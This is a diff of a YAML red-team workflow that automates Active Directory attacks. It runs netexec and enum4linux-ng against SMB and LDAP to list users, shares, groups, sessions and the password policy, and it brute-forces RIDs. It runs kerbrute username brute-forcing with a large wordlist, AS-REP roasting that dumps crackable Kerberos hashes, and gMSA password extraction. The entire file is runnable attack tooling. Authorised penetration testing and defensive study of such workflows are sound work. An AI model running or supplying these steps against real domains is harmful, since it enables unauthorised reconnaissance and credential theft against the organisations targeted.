@@ -1,16 +1,15 @@
 # yaml-language-server: $schema=~/.ofx/workflow_schema.json
 name: ad-enum
-description: 'Active Directory enumeration — discovers users, shares, groups, policies,
+description: >
+  Active Directory enumeration — discovers users, shares, groups, policies,
   and service accounts using SMB, LDAP, and Kerberos protocols.
-
-  '
 tags:
-- redteam
-- ad
-- enum
-- smb
-- ldap
-- kerberos
+  - redteam
+  - ad
+  - enum
+  - smb
+  - ldap
+  - kerberos
 dispatch:
   inputs:
     target:
@@ -23,196 +22,230 @@ dispatch:
       description: AD domain name (e.g. corp.local)
     username:
       type: string
-      default: ''
+      default: ""
       description: Username for authenticated enum
     password:
       type: string
-      default: ''
+      default: ""
       description: Password or NTLM hash
+
 jobs:
   smb-enum:
     name: SMB Enumeration
     steps:
-    - name: nxc-smb-shares
-      run: 'netexec smb {{ inputs.target }} {{ ''-u '' + inputs.username + '' -p ''
-        + inputs.password if inputs.username else ''-u "" -p ""'' }} --shares 2>/dev/null
-        | tee /tmp/nxc-shares.txt
+      - task: netexec
+        name: nxc-smb-shares
+        with:
+          target: "{{ inputs.target }}"
+          protocol: smb
+          username: '{{ inputs.username if inputs.username else ''"'' }}'
+          password: '{{ inputs.password if inputs.password else ''"'' }}'
+          shares: true
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: nxc-smb-users
-      run: 'netexec smb {{ inputs.target }} {{ ''-u '' + inputs.username + '' -p ''
-        + inputs.password if inputs.username else ''-u "" -p ""'' }} --users 2>/dev/null
-        | tee /tmp/nxc-users.txt
+      - task: netexec
+        name: nxc-smb-users
+        with:
+          target: "{{ inputs.target }}"
+          protocol: smb
+          username: '{{ inputs.username if inputs.username else ''"'' }}'
+          password: '{{ inputs.password if inputs.password else ''"'' }}'
+          users: true
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: nxc-smb-groups
-      run: 'netexec smb {{ inputs.target }} {{ ''-u '' + inputs.username + '' -p ''
-        + inputs.password if inputs.username else ''-u "" -p ""'' }} --groups 2>/dev/null
-        | tee /tmp/nxc-groups.txt
+      - task: netexec
+        name: nxc-smb-groups
+        with:
+          target: "{{ inputs.target }}"
+          protocol: smb
+          username: '{{ inputs.username if inputs.username else ''"'' }}'
+          password: '{{ inputs.password if inputs.password else ''"'' }}'
+          groups: true
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: nxc-smb-sessions
-      run: 'netexec smb {{ inputs.target }} {{ ''-u '' + inputs.username + '' -p ''
-        + inputs.password if inputs.username else ''-u "" -p ""'' }} --sessions 2>/dev/null
-        | tee /tmp/nxc-sessions.txt
+      - task: netexec
+        name: nxc-smb-sessions
+        with:
+          target: "{{ inputs.target }}"
+          protocol: smb
+          username: '{{ inputs.username if inputs.username else ''"'' }}'
+          password: '{{ inputs.password if inputs.password else ''"'' }}'
+          sessions: true
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: nxc-smb-passpol
-      run: 'netexec smb {{ inputs.target }} {{ ''-u '' + inputs.username + '' -p ''
-        + inputs.password if inputs.username else ''-u "" -p ""'' }} --pass-pol 2>/dev/null
-        | tee /tmp/nxc-passpol.txt
+      - task: netexec
+        name: nxc-smb-passpol
+        with:
+          target: "{{ inputs.target }}"
+          protocol: smb
+          username: '{{ inputs.username if inputs.username else ''"'' }}'
+          password: '{{ inputs.password if inputs.password else ''"'' }}'
+          pass_pol: true
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: nxc-rid-brute
-      run: 'netexec smb {{ inputs.target }} {{ ''-u '' + inputs.username + '' -p ''
-        + inputs.password if inputs.username else ''-u "" -p ""'' }} --rid-brute 2>/dev/null
-        | tee /tmp/nxc-rid.txt
+      - task: netexec
+        name: nxc-rid-brute
+        with:
+          target: "{{ inputs.target }}"
+          protocol: smb
+          username: '{{ inputs.username if inputs.username else ''"'' }}'
+          password: '{{ inputs.password if inputs.password else ''"'' }}'
+          rid_brute: true
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: enum4linux-scan
-      run: 'enum4linux-ng -A {{ ''-u '' + inputs.username + '' -p '' + inputs.password
-        if inputs.username else '''' }} {{ inputs.target }} 2>/dev/null | tee /tmp/enum4linux-output.txt
+      - task: enum4linux
+        name: enum4linux-full
+        with:
+          target: "{{ inputs.target }}"
+          username: "{{ inputs.username }}"
+          password: "{{ inputs.password }}"
+          domain: "{{ inputs.domain }}"
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: collect-smb
-      script: "import re\n\nusers = set()\nshares = set()\ngroups = set()\n\n# Parse\
-        \ RID brute results for users\ntry:\n    with open('/tmp/nxc-rid.txt') as\
-        \ f:\n        for line in f:\n            match = re.search(r'SidTypeUser\\\
-        )\\s+\\\\(.+?)(?:\\s|$)', line)\n            if match:\n                users.add(match.group(1).strip())\n\
-        except FileNotFoundError:\n    pass\n\n# Parse users\ntry:\n    with open('/tmp/nxc-users.txt')\
-        \ as f:\n        for line in f:\n            match = re.search(r'SMB\\s+.*\\\
-        s+(\\S+\\\\)?(\\S+)\\s+', line)\n            if match:\n                users.add(match.group(2).strip())\n\
-        except FileNotFoundError:\n    pass\n\n# Parse shares\ntry:\n    with open('/tmp/nxc-shares.txt')\
-        \ as f:\n        for line in f:\n            match = re.search(r'SMB\\s+.*\\\
-        s+([\\w$]+)\\s+(READ|WRITE|NO ACCESS)', line)\n            if match:\n   \
-        \             shares.add(match.group(1).strip())\nexcept FileNotFoundError:\n\
-        \    pass\n\n# Parse groups\ntry:\n    with open('/tmp/nxc-groups.txt') as\
-        \ f:\n        for line in f:\n            match = re.search(r'SMB\\s+.*\\\
-        s+(.+?)\\s+membercount:', line)\n            if match:\n                groups.add(match.group(1).strip())\n\
-        except FileNotFoundError:\n    pass\n\nwith open('{{ env.OFX_OUTPUTS }}',\
-        \ 'a') as f:\n    f.write(f\"smb_users={chr(10).join(sorted(users))}\\n\"\
-        )\n    f.write(f\"smb_user_count={len(users)}\\n\")\n    f.write(f\"smb_shares={chr(10).join(sorted(shares))}\\\
-        n\")\n    f.write(f\"smb_share_count={len(shares)}\\n\")\n    f.write(f\"\
-        smb_groups={chr(10).join(sorted(groups))}\\n\")\n    f.write(f\"smb_group_count={len(groups)}\\\
-        n\")\n\nprint(f\"SMB enum: {len(users)} users, {len(shares)} shares, {len(groups)}\
-        \ groups\")\n"
+      - name: collect-smb
+        script: |
+          users = set()
+          shares = set()
+
+          # From netexec user enumeration (typed outputs)
+          for idx in [1, 5]:  # nxc-smb-users, nxc-rid-brute
+              step_data = {{ steps | tojson }}
+              typed = step_data[idx].get('outputs', {}).get('typed_outputs', [])
+              for item in typed:
+                  if item.get('_type') == 'user_account' and item.get('username'):
+                      users.add(item['username'])
+
+          # From enum4linux
+          e4l_data = {{ users(steps[6].outputs.typed_outputs) | tojson }}
+          for item in e4l_data:
+              if item.get('username'):
+                  users.add(item['username'])
+
+          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+              f.write(f"smb_users={chr(10).join(sorted(users))}\n")
+              f.write(f"smb_user_count={len(users)}\n")
+
+          print(f"SMB enum: {len(users)} users discovered")
+        log-stdout: true
+
   kerberos-enum:
     name: Kerberos Enumeration
     steps:
-    - name: kerbrute-userenum
-      run: 'kerbrute userenum --dc {{ inputs.target }} -d {{ inputs.domain }} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
-        2>/dev/null | tee /tmp/kerbrute-users.txt
+      - task: kerbrute
+        name: kerbrute-userenum
+        with:
+          target: "{{ inputs.target }}"
+          mode: userenum
+          dc: "{{ inputs.target }}"
+          domain: "{{ inputs.domain }}"
+          users: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
+        log-stdout: true
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: asrep-roast
-      run: 'netexec ldap {{ inputs.target }} -u {{ inputs.username if inputs.username
-        else ''""'' }} -p {{ inputs.password if inputs.password else ''""'' }} --asreproast
-        /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt
+      - name: asrep-roast
+        run: |
+          netexec ldap {{ inputs.target }} -u {{ inputs.username if inputs.username else '""' }} -p {{ inputs.password if inputs.password else '""' }} --asreproast /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt
+        continue-on-error: true
 
-        '
-      continue-on-error: true
-    - name: collect-kerberos
-      script: "import re\n\nkerb_users = set()\nasrep_users = set()\n\n# Parse kerbrute\
-        \ results\ntry:\n    with open('/tmp/kerbrute-users.txt') as f:\n        for\
-        \ line in f:\n            match = re.search(r'VALID USERNAME:\\s+(\\S+)@',\
-        \ line)\n            if match:\n                kerb_users.add(match.group(1))\n\
-        except FileNotFoundError:\n    pass\n\n# Parse AS-REP roastable users\ntry:\n\
-        \    with open('/tmp/asrep-hashes.txt') as f:\n        for line in f:\n  \
-        \          if line.startswith('$krb5asrep$'):\n                match = re.search(r'\\\
-        $krb5asrep\\$23?\\$(.+?)@', line)\n                if match:\n           \
-        \         asrep_users.add(match.group(1))\nexcept FileNotFoundError:\n   \
-        \ pass\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"kerb_users={chr(10).join(sorted(kerb_users))}\\\
-        n\")\n    f.write(f\"kerb_user_count={len(kerb_users)}\\n\")\n    f.write(f\"\
-        asrep_users={chr(10).join(sorted(asrep_users))}\\n\")\n    f.write(f\"asrep_count={len(asrep_users)}\\\
-        n\")\n\nprint(f\"Kerberos: {len(kerb_users)} valid users, {len(asrep_users)}\
-        \ AS-REP roastable\")\n"
+      - name: collect-kerberos
+        script: |
+          import re
+
+          kerb_users = set()
+          asrep_users = set()
+
+          # From kerbrute typed outputs
+          kerb_out = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+          for item in kerb_out:
+              if item.get('username'):
+                  kerb_users.add(item['username'])
+
+          # Parse AS-REP roastable users
+          try:
+              with open('/tmp/asrep-hashes.txt') as f:
+                  for line in f:
+                      if line.startswith('$krb5asrep$'):
+                          match = re.search(r'\$krb5asrep\$23?\$(.+?)@', line)
+                          if match:
+                              asrep_users.add(match.group(1))
+          except FileNotFoundError:
+              pass
+
+          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+              f.write(f"kerb_users={chr(10).join(sorted(kerb_users))}\n")
+              f.write(f"kerb_user_count={len(kerb_users)}\n")
+              f.write(f"asrep_users={chr(10).join(sorted(asrep_users))}\n")
+              f.write(f"asrep_count={len(asrep_users)}\n")
+
+          print(f"Kerberos: {len(kerb_users)} valid users, {len(asrep_users)} AS-REP roastable")
+        log-stdout: true
+
   ldap-enum:
     name: LDAP Enumeration
     steps:
-    - name: nxc-ldap-users
-      run: '{% if inputs.username %}
+      - task: netexec
+        name: nxc-ldap-users
+        with:
+          target: "{{ inputs.target }}"
+          protocol: ldap
+          username: "{{ inputs.username }}"
+          password: "{{ inputs.password }}"
+          users: true
+        if: "{{ inputs.username }}"
+        log-stdout: true
+        continue-on-error: true
 
-        netexec ldap {{ inputs.target }} -u {{ inputs.username }} -p {{ inputs.password
-        }} --users 2>/dev/null | tee /tmp/ldap-users.txt
+      - name: nxc-ldap-gmsa
+        run: |
+          {% if inputs.username %}
+          netexec ldap {{ inputs.target }} -u {{ inputs.username }} -p {{ inputs.password }} --gmsa 2>/dev/null | tee /tmp/ldap-gmsa.txt
+          {% else %}
+          echo "Skipping LDAP gMSA enum (no credentials provided)"
+          {% endif %}
+        continue-on-error: true
 
-        {% else %}
+      - name: collect-ldap
+        script: |
+          ldap_users = set()
 
-        echo "Skipping LDAP user enum (no credentials provided)"
+          # From netexec LDAP typed outputs
+          nxc_out = {{ users(steps[0].outputs.typed_outputs) | tojson }}
+          for item in nxc_out:
+              if item.get('username'):
+                  ldap_users.add(item['username'])
 
-        {% endif %}
+          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+              f.write(f"ldap_users={chr(10).join(sorted(ldap_users))}\n")
+              f.write(f"ldap_user_count={len(ldap_users)}\n")
 
-        '
-      continue-on-error: true
-    - name: nxc-ldap-gmsa
-      run: '{% if inputs.username %}
+          print(f"LDAP enum: {len(ldap_users)} users")
+        log-stdout: true
 
-        netexec ldap {{ inputs.target }} -u {{ inputs.username }} -p {{ inputs.password
-        }} --gmsa 2>/dev/null | tee /tmp/ldap-gmsa.txt
-
-        {% else %}
-
-        echo "Skipping LDAP gMSA enum (no credentials provided)"
-
-        {% endif %}
-
-        '
-      continue-on-error: true
-    - name: collect-ldap
-      script: "import re\n\nldap_users = set()\n\ntry:\n    with open('/tmp/ldap-users.txt')\
-        \ as f:\n        for line in f:\n            match = re.search(r'LDAP\\s+.*\\\
-        s+(\\S+)\\s+', line)\n            if match:\n                user = match.group(1).strip()\n\
-        \                if user and user not in ('LDAP', '445', '[*]', '[+]'):\n\
-        \                    ldap_users.add(user)\nexcept FileNotFoundError:\n   \
-        \ pass\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"ldap_users={chr(10).join(sorted(ldap_users))}\\\
-        n\")\n    f.write(f\"ldap_user_count={len(ldap_users)}\\n\")\n\nprint(f\"\
-        LDAP enum: {len(ldap_users)} users\")\n"
   summary:
     name: AD Enumeration Summary
-    needs:
-    - smb-enum
-    - kerberos-enum
-    - ldap-enum
+    needs: [smb-enum, kerberos-enum, ldap-enum]
     steps:
-    - name: report
-      run: 'echo "======================================================"
-
-        echo " AD ENUMERATION COMPLETE: {{ inputs.target }}"
-
-        echo " Domain: {{ inputs.domain }}"
-
-        echo "======================================================"
-
-        echo ""
-
-        echo "--- SMB Enumeration ---"
-
-        echo "Users found: {{ jobs[''smb-enum''].outputs.smb_user_count }}"
-
-        echo "Shares found: {{ jobs[''smb-enum''].outputs.smb_share_count }}"
-
-        echo "Groups found: {{ jobs[''smb-enum''].outputs.smb_group_count }}"
-
-        echo ""
-
-        echo "--- Kerberos Enumeration ---"
-
-        echo "Valid users: {{ jobs[''kerberos-enum''].outputs.kerb_user_count }}"
-
-        echo "AS-REP roastable: {{ jobs[''kerberos-enum''].outputs.asrep_count }}"
-
-        echo ""
-
-        echo "--- LDAP Enumeration ---"
-
-        echo "LDAP users: {{ jobs[''ldap-enum''].outputs.ldap_user_count }}"
-
-        '
-      log-stdout: true
+      - name: report
+        run: |
+          echo "======================================================"
+          echo " AD ENUMERATION COMPLETE: {{ inputs.target }}"
+          echo " Domain: {{ inputs.domain }}"
+          echo "======================================================"
+          echo ""
+          echo "--- SMB Enumeration ---"
+          echo "Users found: {{ jobs['smb-enum'].outputs.smb_user_count }}"
+          echo ""
+          echo "--- Kerberos Enumeration ---"
+          echo "Valid users: {{ jobs['kerberos-enum'].outputs.kerb_user_count }}"
+          echo "AS-REP roastable: {{ jobs['kerberos-enum'].outputs.asrep_count }}"
+          echo ""
+          echo "--- LDAP Enumeration ---"
+          echo "LDAP users: {{ jobs['ldap-enum'].outputs.ldap_user_count }}"
+        log-stdout: true
